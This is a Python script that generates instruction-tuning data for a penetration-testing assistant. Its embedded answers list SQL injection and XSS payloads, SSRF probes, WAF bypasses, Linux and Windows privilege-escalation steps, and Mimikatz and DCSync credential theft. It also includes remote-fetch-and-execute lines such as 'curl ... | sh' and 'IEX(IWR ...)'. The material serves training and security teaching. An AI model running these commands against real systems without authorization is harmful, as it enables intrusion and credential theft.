#!/usr/bin/env python3
"""
Expanded Training Sample Generator
Creates variations and expanded samples to reach 5000+ target
"""

import json
import random
from pathlib import Path
import itertools

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================
# QUESTION VARIATIONS
# ============================================

def generate_question_variations():
    """Generate variations of common pentest questions"""
    samples = []
    
    base_questions = [
        {
            "topic": "network scanning",
            "questions": [
                "How do I scan for open ports?",
                "What's the best way to enumerate network services?",
                "How do I discover hosts on a network?",
                "What nmap commands should I use for reconnaissance?",
                "How do I perform service version detection?",
            ],
            "answer": """Network Scanning Guide

[PORT SCANNING]
```
# Quick scan top 1000 ports
nmap -sS TARGET

# Full port scan
nmap -p- TARGET

# Service version detection
nmap -sV -sC TARGET

# Comprehensive scan
nmap -sV -sC -O -A TARGET
```

[HOST DISCOVERY]
```
# Ping sweep
nmap -sn 10.0.0.0/24

# ARP scan (local network)
arp-scan -l

# No ping (bypass firewall)
nmap -Pn TARGET
```

[BEST PRACTICES]
1. Start with light scans, escalate as needed
2. Document all findings
3. Verify scope before scanning
4. Consider timing options (-T0 to -T5)

[STEALTH CONSIDERATIONS]
- Use -sS for SYN scan (stealthier)
- Avoid -A flag if trying to be quiet
- Split scans over time to reduce detection"""
        },
        {
            "topic": "SQL injection",
            "questions": [
                "How do I test for SQL injection?",
                "What are common SQLi payloads?",
                "How do I exploit SQL injection vulnerabilities?",
                "How do I bypass WAF with SQL injection?",
                "What's the difference between error-based and blind SQLi?",
            ],
            "answer": """SQL Injection Testing Guide

[DETECTION PAYLOADS]
```
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
1' AND '1'='1
1 AND 1=1
' UNION SELECT NULL--
```

[EXPLOITATION TYPES]

Error-based SQLi:
- Errors reveal data directly
- Faster extraction
- Example: ' AND (SELECT * FROM users)--

Blind SQLi:
- No visible errors
- Infer data through response differences
- Boolean: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
- Time-based: ' AND SLEEP(5)--

Union-based SQLi:
- Append results to query
- Example: ' UNION SELECT username,password FROM users--

[AUTOMATED TESTING]
```
# Basic sqlmap test
sqlmap -u "http://target/page?id=1" --dbs

# With POST data
sqlmap -u "http://target/login" --data="user=admin&pass=test" --dbs

# Through proxy for manual verification
sqlmap -u "http://target/page?id=1" --proxy=http://127.0.0.1:8080
```

[WAF BYPASS]
- Case variation: SeLeCt
- Comment insertion: SEL/**/ECT
- URL encoding: %53ELECT
- Unicode: %u0053ELECT"""
        },
        {
            "topic": "privilege escalation Linux",
            "questions": [
                "How do I escalate privileges on Linux?",
                "What are common Linux privesc vectors?",
                "How do I find SUID binaries for privesc?",
                "How do I exploit sudo misconfigurations?",
                "What commands should I run for Linux enumeration?",
            ],
            "answer": """Linux Privilege Escalation Guide

[QUICK ENUMERATION]
```
# Current user context
id && whoami && groups

# System information
uname -a && cat /etc/os-release

# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# World-writable files
find / -perm -2 -type f 2>/dev/null

# Cron jobs
cat /etc/crontab && ls -la /etc/cron.*
```

[COMMON VECTORS]

1. SUID/SGID Binaries:
   - GTFOBins for exploitation techniques
   - Example: /usr/bin/find with SUID can spawn shell

2. Sudo Misconfigurations:
   - sudo -l shows permitted commands
   - Check GTFOBins for privilege escalation methods

3. Cron Jobs:
   - World-writable scripts run by root
   - PATH manipulation in cron environment

4. Kernel Exploits:
   - Check kernel version: uname -r
   - Search: searchsploit linux kernel [version]

5. Service Exploits:
   - ps aux | grep root for running services
   - Check for vulnerable versions

[AUTOMATED TOOLS]
```
# LinPEAS
curl -L https://github.com/.../linpeas.sh | sh

# Linux Smart Enumeration
./lse.sh -l 2

# Linux Exploit Suggester
./les.sh
```

[DOCUMENTATION]
- Screenshot all findings
- Note exploitable vectors
- Prioritize by success likelihood"""
        },
        {
            "topic": "privilege escalation Windows",
            "questions": [
                "How do I escalate privileges on Windows?",
                "What are common Windows privesc vectors?",
                "How do I find unquoted service paths?",
                "How do I exploit AlwaysInstallElevated?",
                "What commands should I run for Windows enumeration?",
            ],
            "answer": """Windows Privilege Escalation Guide

[QUICK ENUMERATION]
```
# Current user context
whoami /all
net user %username%

# System information
systeminfo
hostname && ver

# Check for useful privileges
whoami /priv

# Running services
wmic service get name,displayname,pathname,startmode
```

[COMMON VECTORS]

1. Unquoted Service Paths:
   ```
   wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\"
   ```
   - Place malicious exe in unquoted path

2. Weak Service Permissions:
   ```
   accesschk.exe -uwcqv "Authenticated Users" * /accepteula
   ```
   - Modify service binary path

3. AlwaysInstallElevated:
   ```
   reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
   ```
   - Install malicious MSI as SYSTEM

4. DLL Hijacking:
   - Missing DLL in PATH
   - Place malicious DLL in writable location

5. Token Impersonation:
   - SeImpersonatePrivilege -> Potato attacks
   - JuicyPotato, PrintSpoofer, etc.

[AUTOMATED TOOLS]
```
# PowerUp
powershell -ep bypass -c "IEX(IWR 'https://.../PowerUp.ps1'); Invoke-AllChecks"

# WinPEAS
winpeas.exe

# SharpUp
SharpUp.exe
```

[CREDENTIAL HARVESTING]
```
# Mimikatz
sekurlsa::logonpasswords
lsadump::sam

# Registry secrets
reg query HKLM /f password /t REG_SZ /s
```"""
        },
        {
            "topic": "password cracking",
            "questions": [
                "How do I crack password hashes?",
                "What's the best wordlist for cracking?",
                "How do I use hashcat effectively?",
                "How do I identify hash types?",
                "What are good password cracking strategies?",
            ],
            "answer": """Password Cracking Guide

[HASH IDENTIFICATION]
```
# Using hash-identifier
hash-identifier [hash]

# Using hashid
hashid -m [hash]  # -m shows hashcat mode

# Common hash types:
# MD5: 32 hex chars
# SHA1: 40 hex chars  
# NTLM: 32 hex chars
# bcrypt: $2a$..., $2b$...
# SHA512crypt: $6$...
```

[HASHCAT BASICS]
```
# Dictionary attack
hashcat -m [mode] hash.txt wordlist.txt

# With rules
hashcat -m [mode] hash.txt wordlist.txt -r rules/best64.rule

# Brute force (mask attack)
hashcat -m [mode] hash.txt -a 3 ?a?a?a?a?a?a

# Hybrid (wordlist + mask)
hashcat -m [mode] hash.txt wordlist.txt -a 6 ?d?d?d?d
```

[COMMON MODES]
- 0: MD5
- 100: SHA1
- 1000: NTLM
- 1800: SHA512crypt
- 3200: bcrypt
- 5600: NTLMv2

[WORDLISTS]
- rockyou.txt (most common)
- SecLists (comprehensive)
- CrackStation (massive)
- Custom from target research

[ATTACK STRATEGIES]
1. Start with rockyou.txt
2. Add rules for variations
3. Create custom wordlist from target
4. Hybrid attacks for patterns
5. Brute force only as last resort

[PERFORMANCE TIPS]
- Use GPU (-d 1,2 for multi-GPU)
- Workload tuning (-w 3 for max performance)
- Potfile management (--potfile-path)
- Session recovery (--session, --restore)"""
        },
        {
            "topic": "Active Directory attacks",
            "questions": [
                "How do I attack Active Directory?",
                "What is Kerberoasting?",
                "How do I perform DCSync?",
                "What is AS-REP roasting?",
                "How do I enumerate AD with BloodHound?",
            ],
            "answer": """Active Directory Attack Guide

[ENUMERATION]
```
# BloodHound collection
SharpHound.exe -c all
Invoke-BloodHound -CollectionMethod All

# Manual enumeration
Get-ADDomain
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter * | select name
```

[KERBEROASTING]
Target: Service accounts with SPNs
```
# Find SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Request tickets
Rubeus.exe kerberoast

# Crack tickets
hashcat -m 13100 tickets.txt wordlist.txt
```

[AS-REP ROASTING]
Target: Accounts with "Do not require pre-auth"
```
# Find vulnerable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# Request AS-REP
Rubeus.exe asreproast

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

[DCSYNC]
Requirement: Replication rights (Domain Admin or specific delegation)
```
# Using Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt

# Using secretsdump
secretsdump.py corp.local/admin:password@dc01.corp.local
```

[PASS THE HASH/TICKET]
```
# Pass the Hash
sekurlsa::pth /user:admin /ntlm:hash /domain:corp.local

# Pass the Ticket
Rubeus.exe ptt /ticket:base64ticket
```

[ATTACK PATHS]
1. Enumerate with BloodHound
2. Find shortest path to DA
3. Kerberoast service accounts
4. Target nested group memberships
5. Exploit delegation misconfigurations
6. DCSync for persistence"""
        },
        {
            "topic": "web application testing",
            "questions": [
                "How do I test web applications for vulnerabilities?",
                "What tools should I use for web app pentesting?",
                "How do I find hidden directories and files?",
                "How do I test for XSS vulnerabilities?",
                "What is SSRF and how do I test for it?",
            ],
            "answer": """Web Application Testing Guide

[RECONNAISSANCE]
```
# Directory brute forcing
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# Technology detection
whatweb http://target
wappalyzer (browser extension)

# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
```

[VULNERABILITY TESTING]

XSS Testing:
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

SSRF Testing:
```
# Test internal access
url=http://localhost/admin
url=http://169.254.169.254/latest/meta-data/

# Bypass filters
url=http://127.0.0.1:80
url=http://0.0.0.0
url=http://[::1]
```

[TOOLS SETUP]
```
# Burp Suite (essential)
- Configure browser proxy
- Use intruder for fuzzing
- Repeater for manual testing

# OWASP ZAP (free alternative)
zaproxy &
```

[METHODOLOGY]
1. Mapping: Identify all endpoints, parameters
2. Analysis: Understand application logic
3. Testing: Systematic vulnerability testing
4. Exploitation: Prove impact
5. Documentation: Clear evidence

[COMMON FINDINGS]
- Injection (SQL, Command, etc.)
- Broken Authentication
- Sensitive Data Exposure
- XXE
- Broken Access Control
- Security Misconfiguration
- XSS
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging"""
        },
    ]
    
    for item in base_questions:
        # Generate sample for each question variation
        for question in item["questions"]:
            samples.append({
                "instruction": question,
                "input": f"During authorized penetration test, testing {item['topic']}.",
                "output": item["answer"].strip()
            })
    
    return samples


def generate_tool_variations():
    """Generate tool-specific variations"""
    samples = []
    
    tools = {
        "nmap": {
            "commands": [
                ("-sS", "SYN scan (stealth)", "Half-open scan, doesn't complete TCP handshake"),
                ("-sT", "Connect scan", "Full TCP connection, more reliable but less stealthy"),
                ("-sU", "UDP scan", "Scan UDP ports, slower than TCP"),
                ("-sV", "Version detection", "Probe open ports to determine service/version info"),
                ("-sC", "Default scripts", "Runs default NSE scripts for enumeration"),
                ("-O", "OS detection", "Attempt to determine operating system"),
                ("-A", "Aggressive scan", "Enable OS detection, version detection, script scanning"),
                ("-p-", "All ports", "Scan all 65535 ports"),
                ("--top-ports", "Top ports", "Scan most common ports (e.g., --top-ports 1000)"),
                ("-Pn", "No ping", "Skip host discovery, treat all hosts as online"),
                ("-T4", "Timing template", "Aggressive timing (T0-T5, T4 is fast)"),
                ("--script", "NSE scripts", "Run specific Nmap Scripting Engine scripts"),
            ],
            "use_cases": ["reconnaissance", "service enumeration", "vulnerability scanning", "host discovery"]
        },
        "gobuster": {
            "commands": [
                ("dir", "Directory mode", "Brute force directories and files"),
                ("dns", "DNS mode", "Brute force subdomains"),
                ("vhost", "VHost mode", "Brute force virtual hosts"),
                ("-w", "Wordlist", "Specify wordlist to use"),
                ("-x", "Extensions", "File extensions to search for (e.g., -x php,html)"),
                ("-t", "Threads", "Number of concurrent threads"),
                ("-o", "Output", "Save results to file"),
                ("-k", "Skip TLS", "Skip TLS certificate verification"),
                ("-r", "Follow redirects", "Follow redirects"),
            ],
            "use_cases": ["directory enumeration", "subdomain discovery", "content discovery"]
        },
        "burpsuite": {
            "commands": [
                ("Proxy", "Intercept traffic", "Capture and modify HTTP/HTTPS requests"),
                ("Repeater", "Manual testing", "Modify and resend individual requests"),
                ("Intruder", "Automated attacks", "Automated fuzzing and brute forcing"),
                ("Scanner", "Vuln scanning", "Automated vulnerability scanning (Pro)"),
                ("Decoder", "Encoding/decoding", "Transform data between various formats"),
                ("Comparer", "Diff tool", "Compare requests/responses"),
                ("Collaborator", "OOB testing", "Out-of-band vulnerability testing"),
            ],
            "use_cases": ["web app testing", "manual exploitation", "traffic analysis", "fuzzing"]
        },
        "metasploit": {
            "commands": [
                ("search", "Find exploits", "Search for modules by keyword"),
                ("use", "Select module", "Select an exploit/auxiliary module"),
                ("show options", "View settings", "Display required and optional settings"),
                ("set RHOSTS", "Set target", "Specify target IP/hostname"),
                ("set LHOST", "Set listener", "Specify local IP for reverse shells"),
                ("exploit/run", "Execute", "Launch the selected module"),
                ("sessions", "Manage sessions", "List and interact with active sessions"),
                ("background", "Background session", "Send current session to background"),
            ],
            "use_cases": ["exploitation", "post-exploitation", "payload generation", "vulnerability scanning"]
        },
        "hashcat": {
            "commands": [
                ("-m", "Hash type", "Specify hash mode (0=MD5, 1000=NTLM, etc.)"),
                ("-a", "Attack mode", "0=dictionary, 3=brute force, 6/7=hybrid"),
                ("-r", "Rules", "Apply rules to wordlist"),
                ("-o", "Output", "Save cracked passwords to file"),
                ("--show", "Show cracked", "Display previously cracked hashes"),
                ("-w", "Workload", "Workload profile (1-4)"),
                ("--session", "Session name", "Name session for recovery"),
                ("--restore", "Restore", "Resume from saved session"),
            ],
            "use_cases": ["password cracking", "hash recovery", "credential testing"]
        }
    }
    
    for tool, data in tools.items():
        for flag, name, description in data["commands"]:
            output = f"""{tool.upper()} Command Reference: {flag}

[COMMAND]
{flag}

[NAME]
{name}

[DESCRIPTION]
{description}

[COMMON USE CASES]
{chr(10).join(f"- {uc}" for uc in data["use_cases"])}

[EXAMPLE USAGE]
```
# Basic usage with {flag}
{tool} {flag} [options] target
```

[DOCUMENTATION]
- Verify tool is in scope
- Document command and results
- Consider operational security implications"""
            
            samples.append({
                "instruction": f"Explain the {tool} {flag} option.",
                "input": f"Using {tool} for {random.choice(data['use_cases'])}.",
                "output": output.strip()
            })
    
    return samples


def generate_scenario_variations():
    """Generate additional scenario variations"""
    samples = []
    
    scenarios = [
        {
            "environment": "Corporate Internal Network",
            "description": "You've gained initial access to a workstation in a corporate network",
            "objectives": ["enumerate AD", "find sensitive data", "escalate privileges", "move laterally"],
            "constraints": ["avoid detection", "no denial of service", "document everything"]
        },
        {
            "environment": "Web Application",
            "description": "Testing an e-commerce web application for vulnerabilities",
            "objectives": ["find injection points", "test authentication", "check access control", "find data exposure"],
            "constraints": ["no customer data exfiltration", "no production impact", "testing hours only"]
        },
        {
            "environment": "Cloud Infrastructure (AWS)",
            "description": "Assessing security of AWS environment with limited credentials",
            "objectives": ["enumerate resources", "check misconfigurations", "test IAM policies", "find exposed data"],
            "constraints": ["non-production only", "no resource deletion", "maintain audit trail"]
        },
        {
            "environment": "External Network",
            "description": "External penetration test against company's internet-facing assets",
            "objectives": ["discover assets", "find vulnerabilities", "gain initial access", "prove impact"],
            "constraints": ["verified scope only", "no social engineering", "business hours"]
        },
    ]
    
    phases = ["reconnaissance", "enumeration", "exploitation", "post-exploitation", "reporting"]
    
    for scenario in scenarios:
        for phase in phases:
            output = f"""Penetration Testing Phase: {phase.upper()}

[ENVIRONMENT]
{scenario["environment"]}

[SITUATION]
{scenario["description"]}

[PHASE OBJECTIVES]
{chr(10).join(f"- {obj}" for obj in scenario["objectives"])}

[CONSTRAINTS]
{chr(10).join(f"- {c}" for c in scenario["constraints"])}

[{phase.upper()} ACTIVITIES]
"""
            
            if phase == "reconnaissance":
                output += """
1. Gather information about target
2. Identify technologies and architecture
3. Map attack surface
4. Create target profile

[RECOMMENDED TOOLS]
- nmap for network discovery
- subfinder/amass for subdomain enumeration
- shodan/censys for passive recon
- LinkedIn/Google for OSINT"""
            
            elif phase == "enumeration":
                output += """
1. Probe discovered services
2. Identify versions and configurations
3. Look for known vulnerabilities
4. Map user accounts and shares

[RECOMMENDED TOOLS]
- enum4linux for SMB
- nikto for web servers
- ldapsearch for AD
- snmpwalk for SNMP"""
            
            elif phase == "exploitation":
                output += """
1. Select appropriate exploits
2. Prepare payload/implant
3. Execute exploitation
4. Verify access achieved

[RECOMMENDED TOOLS]
- metasploit for exploitation
- burpsuite for web exploits
- sqlmap for SQL injection
- custom scripts as needed"""
            
            elif phase == "post-exploitation":
                output += """
1. Establish persistence
2. Harvest credentials
3. Enumerate internal network
4. Move laterally toward objectives

[RECOMMENDED TOOLS]
- mimikatz for credentials
- bloodhound for AD paths
- linpeas/winpeas for privesc
- chisel/ligolo for pivoting"""
            
            else:  # reporting
                output += """
1. Document all findings
2. Assess risk and impact
3. Provide remediation guidance
4. Create executive summary

[REPORT ELEMENTS]
- Executive summary
- Technical findings
- Risk ratings (CVSS)
- Remediation recommendations
- Supporting evidence"""
            
            samples.append({
                "instruction": f"Guide me through the {phase} phase of this penetration test.",
                "input": f"Environment: {scenario['environment']}\nSituation: {scenario['description']}",
                "output": output.strip()
            })
    
    return samples


def generate_error_handling_samples():
    """Generate samples for handling common errors and issues"""
    samples = []
    
    errors = [
        {
            "error": "Connection refused",
            "context": "nmap scan shows filtered/closed ports",
            "cause": "Firewall blocking, service not running, wrong port",
            "solutions": ["Try different ports", "Check if service is running", "Try from different source IP", "Use -Pn flag"]
        },
        {
            "error": "Authentication failed",
            "context": "Credential-based attack not working",
            "cause": "Wrong credentials, account locked, MFA enabled",
            "solutions": ["Verify credentials", "Check lockout policy", "Try different authentication method", "Look for alternative accounts"]
        },
        {
            "error": "Permission denied",
            "context": "Can't access file or execute command",
            "cause": "Insufficient privileges, ACL restrictions",
            "solutions": ["Check current privileges", "Look for privesc vectors", "Try different user context", "Check file permissions"]
        },
        {
            "error": "Module failed to load",
            "context": "Metasploit exploit not working",
            "cause": "Missing dependencies, incompatible target, wrong settings",
            "solutions": ["Check module requirements", "Verify target compatibility", "Review all options", "Check for alternative modules"]
        },
        {
            "error": "Hash not cracking",
            "context": "Hashcat running but no results",
            "cause": "Wrong hash type, strong password, insufficient wordlist",
            "solutions": ["Verify hash format", "Try different attack modes", "Use rules", "Create custom wordlist"]
        },
    ]
    
    for error in errors:
        output = f"""Error Troubleshooting: {error["error"]}

[ERROR]
{error["error"]}

[CONTEXT]
{error["context"]}

[LIKELY CAUSES]
{error["cause"]}

[TROUBLESHOOTING STEPS]
{chr(10).join(f"{i+1}. {sol}" for i, sol in enumerate(error["solutions"]))}

[VERIFICATION]
After applying solutions:
1. Confirm the issue is resolved
2. Document what worked
3. Note for future reference

[IF PROBLEM PERSISTS]
- Review tool documentation
- Check for known issues/bugs
- Consider alternative approach
- Document as limitation in report"""
        
        samples.append({
            "instruction": f"Help me troubleshoot this error: {error['error']}",
            "input": f"Getting '{error['error']}' error during {error['context']}.",
            "output": output.strip()
        })
    
    return samples


def main():
    """Generate all variation samples"""
    print("📈 Generating expanded sample variations...")
    
    all_samples = []
    
    generators = [
        ("question_variations", generate_question_variations),
        ("tool_variations", generate_tool_variations),
        ("scenario_variations", generate_scenario_variations),
        ("error_handling", generate_error_handling_samples),
    ]
    
    for name, generator in generators:
        print(f"  Generating {name}...")
        samples = generator()
        all_samples.extend(samples)
        
        # Save category file
        category_file = OUTPUT_DIR / f"{name}.jsonl"
        with open(category_file, 'w') as f:
            for sample in samples:
                f.write(json.dumps(sample) + '\n')
        print(f"    ✓ {len(samples)} samples saved to {category_file.name}")
    
    # Save combined
    combined_file = OUTPUT_DIR / "expanded_combined.jsonl"
    with open(combined_file, 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"\n✅ Total: {len(all_samples)} expanded samples generated")
    return len(all_samples)


if __name__ == "__main__":
    main()
